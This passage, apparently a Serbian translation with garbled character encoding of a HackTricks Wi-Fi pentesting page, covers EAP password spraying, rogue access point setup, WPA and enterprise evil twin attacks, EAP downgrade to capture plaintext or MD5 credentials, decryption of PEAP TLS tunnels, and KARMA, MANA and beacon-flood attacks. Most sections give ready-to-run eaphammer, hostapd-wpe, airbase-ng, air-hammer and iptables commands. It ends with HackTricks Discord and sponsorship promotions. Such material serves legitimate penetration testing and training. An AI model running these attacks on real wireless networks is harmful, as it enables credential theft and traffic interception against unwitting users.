Bez obzira na izabrani protokol, PEAP/TTLS server dobija informaciju o pravom identitetu korisnika nakon Å¡to je TLS tunel uspostavljen. Pravi identitet moÅ¾e biti predstavljen kao korisnik@oblast ili jednostavno korisnik. Ako je PEAP/TTLS server takoÄ‘e odgovoran za autentifikaciju korisnika, sada poseduje identitet korisnika i nastavlja sa autentifikacionim metodom zaÅ¡tiÄ‡enim TLS tunelom. Alternativno, PEAP/TTLS server moÅ¾e proslediti novi RADIUS zahtev RADIUS serveru korisnika. Ovaj novi RADIUS zahtev izostavlja PEAP ili TTLS sloj protokola. U sluÄajevima kada je zaÅ¡tiÄ‡eni autentifikacioni metod EAP, unutraÅ¡nje EAP poruke se prenose ka matiÄnom RADIUS serveru bez EAP-PEAP ili EAP-TTLS omotaÄa. Atribut KorisniÄko Ime izlazne RADIUS poruke sadrÅ¾i pravi identitet korisnika, zamenjujuÄ‡i anonimni KorisniÄko Ime iz dolaznog RADIUS zahteva. Kada je zaÅ¡tiÄ‡eni autentifikacioni metod PAP ili CHAP (podrÅ¾an samo od strane TTLS), atributi KorisniÄko Ime i ostali atributi autentifikacije izdvojeni iz TLS payload-a se zamenjuju u izlaznoj RADIUS poruci, zamenjujuÄ‡i anonimni KorisniÄko Ime i TTLS EAP-Poruka atribute pronaÄ‘ene u dolaznom RADIUS zahtevu.

Za viÅ¡e informacija pogledajte [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Ako se oÄekuje da klijent koristi **korisniÄko ime i lozinku** (primetite da **EAP-TLS neÄ‡e biti validan** u ovom sluÄaju), tada moÅ¾ete pokuÅ¡ati da dobijete **listu** **korisniÄkih imena** (vidi sledeÄ‡i deo) i **lozinki** i pokuÅ¡ati **bruteforce** pristup koristeÄ‡i [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
MoÅ¾ete izvrÅ¡iti ovaj napad koristeÄ‡i `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teorija napada na klijente

### Selekcija mreÅ¾e i roaming

- Protokol 802.11 definiÅ¡e kako stanica pristupa ProÅ¡irenom servisnom setu (ESS) ali ne specificira kriterijume za izbor ESS-a ili pristupne taÄke (AP) unutar njega.
- Stanice mogu da se kreÄ‡u izmeÄ‘u AP-ova koji dele isti ESSID, odrÅ¾avajuÄ‡i povezanost Å¡irom zgrade ili podruÄja.
- Protokol zahteva autentifikaciju stanice na ESS ali ne nalaÅ¾e AP autentifikaciju stanici.

### Liste preferiranih mreÅ¾a (PNL)

- Stanice Äuvaju ESSID svake beÅ¾iÄne mreÅ¾e kojoj se poveÅ¾u u svojoj Listi preferiranih mreÅ¾a (PNL), zajedno sa detaljima konfiguracije specifiÄnim za mreÅ¾u.
- PNL se koristi za automatsko povezivanje sa poznatim mreÅ¾ama, poboljÅ¡avajuÄ‡i korisniÄko iskustvo optimizacijom procesa povezivanja.

### Pasivno skeniranje

- AP-ovi periodiÄno emituju okvir balzama, najavljujuÄ‡i svoje prisustvo i karakteristike, ukljuÄujuÄ‡i ESSID AP-a osim ako je emitovanje onemoguÄ‡eno.
- Tokom pasivnog skeniranja, stanice sluÅ¡aju okvire balzama. Ako ESSID balzama odgovara unosu u PNL stanice, stanica moÅ¾e automatski da se poveÅ¾e sa tim AP-om.
- Poznavanje PNL ureÄ‘aja omoguÄ‡ava potencijalno iskoriÅ¡Ä‡avanje imitiranjem poznatog ESSID-a mreÅ¾e, prevareÄ‡i ureÄ‘aj da se poveÅ¾e sa laÅ¾nom AP-om.

### Aktivno sondiranje

- Aktivno sondiranje ukljuÄuje slanje zahteva za sondiranje od strane stanica radi otkrivanja obliÅ¾njih AP-ova i njihovih karakteristika.
- Usmereni zahtevi za sondiranje ciljaju odreÄ‘eni ESSID, pomaÅ¾uÄ‡i u otkrivanju da li je odreÄ‘ena mreÅ¾a u dometu, Äak i ako je skrivena mreÅ¾a.
- Emitovani zahtevi za sondiranje imaju polje SSID nula i Å¡alju se svim obliÅ¾njim AP-ovima, omoguÄ‡avajuÄ‡i stanici da proveri bilo koju preferiranu mreÅ¾u bez otkrivanja sadrÅ¾aja svoje PNL.

## Jednostavna AP sa preusmeravanjem na Internet

Pre nego Å¡to objasnimo kako izvesti sloÅ¾enije napade, biÄ‡e objaÅ¡njeno **kako** jednostavno **kreirati** **AP** i **preusmeriti** njegov **saobraÄ‡aj** na interfejs povezan **sa** **Internetom**.

KoristeÄ‡i `ifconfig -a` proverite da li su wlan interfejs za kreiranje AP-a i interfejs povezan sa Internetom prisutni.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Kreirajte konfiguracioni fajl `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Zatim **postavite IP adrese** i **rute**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Zatim **pokrenite** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Napravite konfiguracioni fajl `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zaustavite dosadne procese**, postavite **monitor mod**, i **pokrenite hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### ProsleÄ‘ivanje i Preusmeravanje
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Zli blizanac

Napad zlog blizanca iskoriÅ¡Ä‡ava naÄin na koji WiFi klijenti prepoznaju mreÅ¾e, uglavnom se oslanjajuÄ‡i na ime mreÅ¾e (ESSID) bez potrebe da se bazna stanica (pristupna taÄka) autentifikuje klijentu. KljuÄne taÄke ukljuÄuju:

- **TeÅ¡koÄ‡a u diferencijaciji**: UreÄ‘aji se bore da razlikuju legitimne i laÅ¾ne pristupne taÄke kada dele isti ESSID i tip enkripcije. MreÅ¾e u stvarnom svetu Äesto koriste viÅ¡e pristupnih taÄaka sa istim ESSID-om kako bi proÅ¡irile pokrivenost bez prekida.

- **Roaming klijenata i manipulacija konekcijom**: Protokol 802.11 omoguÄ‡ava ureÄ‘ajima da se kreÄ‡u izmeÄ‘u pristupnih taÄaka unutar istog ESSID-a. NapadaÄi to mogu iskoristiti tako Å¡to Ä‡e privuÄ‡i ureÄ‘aj da se odjavi sa trenutne bazne stanice i poveÅ¾e sa laÅ¾nom. To se moÅ¾e postiÄ‡i nudeÄ‡i jaÄi signal ili ometanjem konekcije sa legitimnom pristupnom taÄkom kroz metode poput paketa deautentifikacije ili ometanja.

- **Izazovi u izvrÅ¡enju**: UspjeÅ¡no izvoÄ‘enje napada zlog blizanca u okruÅ¾enjima sa viÅ¡e dobro postavljenih pristupnih taÄaka moÅ¾e biti izazovno. Deautentifikacija jedne legitimne pristupne taÄke Äesto rezultira ureÄ‘ajem koji se povezuje sa drugom legitimnom pristupnom taÄkom, osim ako napadaÄ ne moÅ¾e deautentifikovati sve obliÅ¾nje pristupne taÄke ili strategijski postaviti laÅ¾nu pristupnu taÄku.

MoÅ¾ete kreirati vrlo osnovni Open Evil Twin (bez moguÄ‡nosti rutiranja saobraÄ‡aja ka Internetu) koristeÄ‡i:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
TakoÄ‘e moÅ¾ete kreirati Zli blizanac koristeÄ‡i **eaphammer** (primetite da za kreiranje zlih blizanaca sa eaphammer-om interfejs **NE TREBA DA BUDE** u **monitor** reÅ¾imu):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ili koristeÄ‡i Airgeddon: `Opcije: 5,6,7,8,9 (unutar menija napada Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Molimo, primetite da podrazumevano, ako je ESSID u PNL-u saÄuvan kao zaÅ¡tiÄ‡en WPA, ureÄ‘aj se neÄ‡e automatski povezati sa otvorenim zlim blizancem. MoÅ¾ete pokuÅ¡ati da DoS-ujete pravi AP i nadati se da Ä‡e korisnik ruÄno povezati sa vaÅ¡im otvorenim zlim blizancem, ili moÅ¾ete DoS-ovati pravi AP i koristiti WPA zlog blizanca da uhvatite handshake (koristeÄ‡i ovu metodu neÄ‡ete moÄ‡i da pustite Å¾rtvu da se poveÅ¾e sa vama jer ne znate PSK, ali moÅ¾ete uhvatiti handshake i pokuÅ¡ati ga probiti).

_Neki OS i AV Ä‡e upozoriti korisnika da je povezivanje sa otvorenom mreÅ¾om opasno..._

### WPA/WPA2 Zli Blizanac

MoÅ¾ete kreirati **Zlog Blizanca koristeÄ‡i WPA/2** i ako su ureÄ‘aji konfigurisani da se poveÅ¾u sa tim SSID-om sa WPA/2, pokuÅ¡aÄ‡e da se poveÅ¾u. U svakom sluÄaju, **da biste zavrÅ¡ili 4-way-handshake** takoÄ‘e morate **znati** **Å¡ifru** koju Ä‡e klijent koristiti. Ako je **ne znate**, **povezivanje neÄ‡e biti zavrÅ¡eno**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Poslovni Evil Twin

Da biste razumeli ove napade, preporuÄujem da prvo proÄitate kratko [objaÅ¡njenje WPA Enterprise](./#wpa-enterprise-mgt).

**KoriÅ¡Ä‡enje hostapd-wpe**

`hostapd-wpe` zahteva **konfiguracioni** fajl da bi radio. Da biste **automatizovali** generisanje ovih konfiguracija, moÅ¾ete koristiti [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (preuzmite python fajl unutar _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
U konfiguracionom fajlu moÅ¾ete izabrati razliÄite stvari poput ssid, kanala, korisniÄkih fajlova, kljuÄeva, dh parametara, verzije wpa i autentifikacije...

[**KoriÅ¡Ä‡enje hostapd-wpe sa EAP-TLS za omoguÄ‡avanje prijave bilo kog sertifikata.**](evil-twin-eap-tls.md)

**KoriÅ¡Ä‡enje EAPHammer-a**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Podrazumevano, EAPHammer koristi ove metode autentikacije (primetite da je GTC prva koja se koristi kako bi se dobile lozinke u obliku obiÄnog teksta, a zatim se koriste pouzdanije metode autentikacije):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ovo je podrazumevana metodologija kako biste izbegli dugaÄka vremena povezivanja. MeÄ‘utim, takoÄ‘e moÅ¾ete specificirati serveru metode autentikacije od najslabije do najjaÄe:
```
--negotiate weakest
```
Ili moÅ¾ete koristiti:

* `--negotiate gtc-downgrade` za koriÅ¡Ä‡enje visoko efikasne implementacije GTC downgrade-a (lozinke u plaintext formatu)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` za ruÄno odreÄ‘ivanje ponuÄ‘enih metoda (ponuÄ‘ene autentikacione metode u istom redosledu kao organizacija Ä‡e uÄiniti napad mnogo teÅ¾e otkriti).
* [PronaÄ‘ite viÅ¡e informacija u wiki-u](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**KoriÅ¡Ä‡enje Airgeddon-a**

`Airgeddon` moÅ¾e koristiti prethodno generisane sertifikate da ponudi EAP autentikaciju za WPA/WPA2-Enterprise mreÅ¾e. LaÅ¾na mreÅ¾a Ä‡e smanjiti protokol veze na EAP-MD5 kako bi mogla **uhvatiti korisnika i MD5 lozinke**. Kasnije, napadaÄ moÅ¾e pokuÅ¡ati da probije lozinku.\
`Airggedon` vam nudi moguÄ‡nost **kontinuiranog napada Evil Twin (buka)** ili **samo kreiranje Evil napada dok se neko poveÅ¾e (neprimetno).**

![](<../../.gitbook/assets/image (129).png>)

### Otklanjanje greÅ¡aka u PEAP i EAP-TTLS TLS tunelima u napadima Evil Twins

_Ovaj metod je testiran u PEAP vezi ali poÅ¡to deÅ¡ifrujem proizvoljan TLS tunel, ovo bi takoÄ‘e trebalo da funkcioniÅ¡e sa EAP-TTLS_

Unutar **konfiguracije** _hostapd-wpe_ **iskomentariÅ¡ite** liniju koja sadrÅ¾i _**dh\_file**_ (od `dh_file=/etc/hostapd-wpe/certs/dh` do `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Ovo Ä‡e naterati `hostapd-wpe` da **razmenjuje kljuÄeve koristeÄ‡i RSA** umesto DH, tako da Ä‡ete moÄ‡i da **deÅ¡ifrujete** saobraÄ‡aj kasnije **znajuÄ‡i privatni kljuÄ servera**.

Sada pokrenite **Evil Twin** koristeÄ‡i **`hostapd-wpe`** sa tom modifikovanom konfiguracijom kao i obiÄno. TakoÄ‘e, pokrenite **`wireshark`** na **interfejsu** koji vrÅ¡i napad Evil Twin.

Sada ili kasnije (kada veÄ‡ uhvatite neke autentikacione namere) moÅ¾ete dodati privatni RSA kljuÄ u wireshark-u na: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodajte novi unos i popunite formu sa ovim vrednostima: **IP adresa = bilo koja** -- **Port = 0** -- **Protokol = podaci** -- **Datoteka kljuÄa** (**izaberite svoju datoteku kljuÄa**, da biste izbegli probleme izaberite datoteku kljuÄa **koja nije zaÅ¡tiÄ‡ena lozinkom**).

![](<../../.gitbook/assets/image (151).png>)

I pogledajte novi **"DeÅ¡ifrovani TLS" tab**:

![](<../../.gitbook/assets/image (152).png>)

## KARMA, MANA, Loud MANA i Known beacons napad

### ESSID i MAC crne/belih lista

RazliÄite vrste Media Access Control Filter Lists (MFACLs) i njihovi odgovarajuÄ‡i reÅ¾imi i efekti na ponaÅ¡anje laÅ¾ne Access Point (AP):

1. **MAC bazirana bela lista**:
- LaÅ¾ni AP Ä‡e odgovoriti samo na upite ureÄ‘aja navedenih u beloj listi, ostajuÄ‡i nevidljiv za sve ostale koji nisu navedeni.

2. **MAC bazirana crna lista**:
- LaÅ¾ni AP Ä‡e ignorisati upite ureÄ‘aja na crnoj listi, efikasno ÄineÄ‡i laÅ¾ni AP nevidljivim za te specifiÄne ureÄ‘aje.

3. **SSID bazirana bela lista**:
- LaÅ¾ni AP Ä‡e odgovoriti na upite samo za specifiÄne ESSID-ove navedene na listi, ÄineÄ‡i ga nevidljivim za ureÄ‘aje Äiji Preferred Network List (PNL) ne sadrÅ¾i te ESSID-ove.

4. **SSID bazirana crna lista**:
- LaÅ¾ni AP neÄ‡e odgovoriti na upite za specifiÄne ESSID-ove na crnoj listi, ÄineÄ‡i ga nevidljivim za ureÄ‘aje koji traÅ¾e te odreÄ‘ene mreÅ¾e.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ova metoda omoguÄ‡ava **napadaÄu da napravi zlonamernu taÄku pristupa (AP) koja odgovara na sve zahteve za sondiranje** ureÄ‘aja koji pokuÅ¡avaju da se poveÅ¾u na mreÅ¾e. Ova tehnika **vara ureÄ‘aje da se poveÅ¾u na napadaÄev AP** imitirajuÄ‡i mreÅ¾e koje ureÄ‘aji traÅ¾e. Kada ureÄ‘aj poÅ¡alje zahtev za povezivanje sa ovom laÅ¾nom AP, on zavrÅ¡ava vezu, navodeÄ‡i ureÄ‘aj da greÅ¡kom poveÅ¾e sa mreÅ¾om napadaÄa.

### MANA

Zatim su **ureÄ‘aji poÄeli da ignoriÅ¡u neÅ¾eljene mreÅ¾ne odgovore**, smanjujuÄ‡i efikasnost originalnog karma napada. MeÄ‘utim, novi metod, poznat kao **MANA napad**, predstavili su Ian de Vilijers i Dominic Vajt. Ova metoda ukljuÄuje zlonamernu AP **hvatanje Lista Preferisanih MreÅ¾a (PNL) sa ureÄ‘aja odgovarajuÄ‡i na njihove emitovane zahteve za sondiranje** sa imenima mreÅ¾a (SSID) koje su prethodno traÅ¾ili ureÄ‘aji. Ovaj sofisticirani napad zaobilazi zaÅ¡titu protiv originalnog karma napada iskoriÅ¡Ä‡avanjem naÄina na koji ureÄ‘aji pamte i prioritizuju poznate mreÅ¾e.

MANA napad funkcioniÅ¡e tako Å¡to prati i usmerene i emitovane zahteve za sondiranje ureÄ‘aja. Za usmerene zahteve, beleÅ¾i MAC adresu ureÄ‘aja i traÅ¾eno ime mreÅ¾e, dodajuÄ‡i ove informacije na listu. Kada se primi emitovan zahtev, AP odgovara informacijama koje se podudaraju sa bilo kojom od mreÅ¾a na listi ureÄ‘aja, privlaÄeÄ‡i ureÄ‘aj da se poveÅ¾e sa zlonamernom AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### BuÄan MANA

**BuÄan MANA napad** je napredna strategija kada ureÄ‘aji ne koriste usmereno istraÅ¾ivanje ili kada je Lista preferiranih mreÅ¾a (PNL) nepoznata napadaÄu. Ovaj napad funkcioniÅ¡e na principu da **ureÄ‘aji u istom podruÄju verovatno dele neka imena mreÅ¾a u svojim PNL-ovima**. Umesto selektivnog odgovaranja, ovaj napad emituje odgovore na upite za svako ime mreÅ¾e (ESSID) pronaÄ‘eno u kombinovanim PNL-ovima svih posmatranih ureÄ‘aja. Ovaj Å¡irok pristup poveÄ‡ava Å¡ansu da ureÄ‘aj prepozna poznatu mreÅ¾u i pokuÅ¡a da se poveÅ¾e sa laÅ¾nom taÄkom pristupa (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Poznati Beacon napad

Kada **Loud MANA napad** moÅ¾da nije dovoljan, **Poznati Beacon napad** predstavlja drugi pristup. Ovom metodom se **brute-force proces povezivanja simulira AP koji odgovara na bilo koje mreÅ¾no ime, prolazeÄ‡i kroz listu potencijalnih ESSID-ova** izvedenih iz wordlist-e. Ovo simulira prisustvo brojnih mreÅ¾a, u nadi da Ä‡e se podudarati ESSID unutar PNL Å¾rtve, podstiÄuÄ‡i pokuÅ¡aj povezivanja sa fabrikovanim AP-om. Napad se moÅ¾e pojaÄati kombinovanjem sa opcijom `--loud` za agresivniji pokuÅ¡aj uhvatiti ureÄ‘aje.

Eaphammer je implementirao ovaj napad kao MANA napad gde su svi ESSID-ovi unutar liste optuÅ¾eni (takoÄ‘e moÅ¾ete kombinovati ovo sa `--loud` opcijom da biste kreirali Loud MANA + Poznati beacon napad):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Poznati napad Beacon Burst**

**Poznati napad Beacon Burst** ukljuÄuje **brzo emitovanje okvira beacon za svaki ESSID naveden u datoteci**. Ovo stvara gustu okolinu laÅ¾nih mreÅ¾a, znaÄajno poveÄ‡avajuÄ‡i verovatnoÄ‡u da se ureÄ‘aji poveÅ¾u sa zlonamernom AP, posebno kada se kombinuje sa MANA napadom. Ova tehnika koristi brzinu i obim da preplavi mehanizme izbora mreÅ¾e ureÄ‘aja.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** je protokol koji omoguÄ‡ava ureÄ‘ajima da se direktno poveÅ¾u jedan s drugim koristeÄ‡i Wi-Fi, bez potrebe za tradicionalnom beÅ¾iÄnom pristupnom taÄkom. Ova sposobnost je integrisana u razliÄite ureÄ‘aje Internet stvari (IoT), kao Å¡to su Å¡tampaÄi i televizori, olakÅ¡avajuÄ‡i direktnu komunikaciju ureÄ‘aja sa ureÄ‘ajem. ZnaÄajna karakteristika Wi-Fi Direct-a je da jedan ureÄ‘aj preuzima ulogu pristupne taÄke, poznate kao vlasnik grupe, kako bi upravljao vezom.

Bezbednost za Wi-Fi Direct veze uspostavlja se putem **Wi-Fi Protected Setup (WPS)**, koji podrÅ¾ava nekoliko metoda za sigurno uparivanje, ukljuÄujuÄ‡i:
- **Konfiguracija putem dugmeta (PBC)**
- **Unos PIN-a**
- **Near-Field Communication (NFC)**

Ove metode, posebno unos PIN-a, podloÅ¾ne su istim ranjivostima kao i WPS u tradicionalnim Wi-Fi mreÅ¾ama, ÄineÄ‡i ih ciljevima sliÄnih vektora napada.

### EvilDirect Hijacking

**EvilDirect Hijacking** je napad specifiÄan za Wi-Fi Direct. On oponaÅ¡a koncept napada Evil Twin, ali cilja Wi-Fi Direct veze. U ovom scenariju, napadaÄ se predstavlja kao legitimni vlasnik grupe sa ciljem da prevari ureÄ‘aje da se poveÅ¾u sa zlonamernim entitetom. Ovaj metod moÅ¾e se izvrÅ¡iti koriÅ¡Ä‡enjem alata poput `airbase-ng` navoÄ‘enjem kanala, ESSID-a i MAC adrese oponaÅ¡anog ureÄ‘aja:

## Reference

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Pogledajte [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (prijava putem Facebook-a i imitacija WPA na portalima za zarobljavanje)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti u realnom vremenu o hakovanju**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Poslednje najave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
